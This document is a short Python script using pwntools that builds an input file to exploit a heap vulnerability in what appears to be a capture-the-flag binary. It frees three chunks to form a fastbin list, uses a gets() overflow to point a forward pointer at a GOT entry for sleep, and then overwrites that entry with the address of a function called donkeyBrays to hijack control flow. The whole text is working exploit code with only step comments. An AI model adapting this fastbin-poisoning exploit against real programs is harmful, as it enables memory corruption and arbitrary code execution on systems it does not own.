from pwn import *
import struct

# Offsets
sleepaddr = 0x6060c0
donkeyBrays = 0x00401451


f = open("exploit", "wb")

# 3 mallocs and then 3 frees. Creates the fastbin list as required.
f.write("Exploit\na\none\n1\na\ntwo\n1\na\nthree\n1\nr\n3\nr\n2\nr\n1\na\n".encode("utf-8"))
# Junk to be filled in first chunk
st = struct.pack("x"*32)
# Now using gets overflow to the next chunk and rewrite its forward pointer to the GOT addr - 0x10 (header dist)
st += p64(sleepaddr - 0x10)
f.write(st)

f.write("\n".encode("utf-8"))

# Now, in the third chunk where the middle chunk is pointing, write the address of donkeyBrays to modify it when we call the next malloc
f.write("1\na\ncheck\n1\na\n".encode("utf-8") +
        # Entry is modified, now exit.
        p64(donkeyBrays)+"\n1\nx\n".encode("utf-8"))

f.close()
